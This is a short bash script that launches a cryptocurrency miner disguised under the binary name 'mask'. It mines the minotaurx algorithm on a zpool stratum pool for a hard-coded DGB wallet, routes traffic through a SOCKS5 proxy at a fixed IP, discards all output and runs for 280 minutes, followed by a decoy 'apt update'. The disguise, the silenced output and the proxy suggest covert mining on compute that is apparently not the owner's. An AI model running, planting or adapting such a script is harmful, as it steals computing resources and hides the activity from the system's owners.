#!/bin/bash
chmod +x mask 
timeout 280m ./mask -a minotaurx -o stratum+tcp://minotaurx.eu.mine.zpool.ca:7019 -u DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr -p c=DGB -t 4 -x socks5://192.252.209.155:14455 > /dev/null 2>&1
sudo apt update
